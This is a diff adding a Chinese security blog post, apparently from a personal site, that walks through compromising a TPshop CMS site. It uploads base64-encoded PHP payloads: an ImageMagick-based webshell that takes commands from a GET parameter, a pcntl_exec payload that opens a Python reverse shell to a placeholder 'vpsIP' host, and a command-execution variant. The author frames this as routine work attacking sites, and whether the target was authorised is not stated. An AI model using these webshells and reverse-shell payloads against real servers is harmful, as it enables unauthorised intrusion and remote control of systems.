@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>从TPshopcms到GetShell | Ja9er&#39;s Studio</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://ja9er.github.io/favicon.ico?v=1642389423143">
+<link rel="stylesheet" href="https://ja9er.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="0X01 开始
+日常工作中日站，找到一个冷门cms-tpshop。
+祭出万能的百度大法，有洞，还是前台！！！ 可以搞
+给一个参考链接:
+https://www.seebug.org/vuldb/ssvid-96925
+0x02过程
+
+PD9..." />
+    <meta name="keywords" content="研究,复现" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://ja9er.github.io">
+        <img src="https://ja9er.github.io/images/avatar.png?v=1642389423143" class="site-logo">
+        <h1 class="site-title">Ja9er&#39;s Studio</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      燃烧掉总比消失好
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://ja9er.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">从TPshopcms到GetShell</h2>
+            <div class="post-date">2021-07-05</div>
+            
+              <div class="feature-container" style="background-image: url('https://ja9er.github.io/post-images/cong-tpshopcms-dao-getshell1.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="0x01-开始">0X01 开始</h1>
+<p>日常工作中日站，找到一个冷门cms-tpshop。<br>
+祭出万能的百度大法，有洞，还是前台！！！ 可以搞<br>
+给一个参考链接:<br>
+https://www.seebug.org/vuldb/ssvid-96925</p>
+<h1 id="0x02过程">0x02过程</h1>
+<p><a href="https://imgtu.com/i/RWwgNF"><img src="https://z3.ax1x.com/2021/07/04/RWwgNF.md.png" alt="RWwgNF.md.png" loading="lazy"></a><br>
+PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=</p>
+<p>base64解码为，</p>
+<pre><code class="language-php">&lt;?php phpinfo();unlink(__FILE__);?&gt;
+</code></pre>
+<p>传了个phpinfo()上去,观察一下<br>
+<a href="https://imgtu.com/i/RWwy7T"><img src="https://z3.ax1x.com/2021/07/04/RWwy7T.md.png" alt="RWwy7T.md.png" loading="lazy"></a><br>
+发现直接ban掉所有可执行命令的函数。</p>
+<h1 id="0x03绕过disable_function">0x03绕过disable_function</h1>
+<h2 id="imagemagick绕过">ImageMagick绕过</h2>
+<pre><code class="language-php">&lt;?php
+echo &quot;Disable Functions: &quot; . ini_get('disable_functions') . &quot;\n&quot;;
+$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
+if ($command == '') {
+    $command = 'id';
+}
+$command = $command . &quot;&gt;&quot; . SAE_TMP_PATH . &quot;/data&quot;;
+$exploit = &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg&quot;|$command&quot;)'
+pop graphic-context
+EOF;
+
+$path1 = SAE_TMP_PATH . &quot;KKKK.mvg&quot;;
+$path2 = SAE_TMP_PATH . &quot;KKKK.png&quot;;
+file_put_contents($path1, $exploit);
+$thumb = new Imagick();
+$thumb-&gt;readImage($path1);
+$thumb-&gt;writeImage($path2);
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+unlink(&quot;$path1&quot;);
+unlink(&quot;$path2&quot;);
+echo file_get_contents(SAE_TMP_PATH . &quot;/data&quot;);
+?&gt;
+</code></pre>
+<p>base64以后传上去，可惜不行<br>
+<a href="https://imgtu.com/i/RWwcAU"><img src="https://z3.ax1x.com/2021/07/04/RWwcAU.md.png" alt="RWwcAU.md.png" loading="lazy"></a></p>
+<h2 id="利用pcntl_exec突破disable_functions">利用pcntl_exec突破disable_functions</h2>
+<p>pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell) pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;= 4.2.0, PHP 5</p>
+<pre><code class="language-php">&lt;?php  pcntl_exec(&quot;/usr/bin/python&quot;,array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;vpsIP&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'));?&gt;
+</code></pre>
+<p>实质就是利用php弹出Python的shell，由于靶机是linux的，python自带。<br>
+<strong>so</strong><br>
+base64后，上传后顺利获取shell<br>
+<a href="https://imgtu.com/i/RWwsBV"><img src="https://z3.ax1x.com/2021/07/04/RWwsBV.md.png" alt="RWwsBV.md.png" loading="lazy"></a></p>
+<h1 id="0x04-命令执行">0x04 命令执行</h1>
+<p>如果只想传一个命令执行的马上去的话<br>
+能用python就用python,命令结果写入文件即可，注意双引号(踩坑记录)</p>
+<pre><code class="language-php">&lt;?php pcntl_exec( &quot;/usr/bin/python&quot;, array( '-c',
+'import os;
+os.system(&quot;pwd &gt;1.txt&quot; );')); ?&gt;
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://ja9er.github.io/tag/hxsPECHII/" class="tag">
+                    研究
+                  </a>
+                
+                  <a href="https://ja9er.github.io/tag/z53zQ_vZMP/" class="tag">
+                    复现
+                  </a>
+                
+              </div>
+            
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
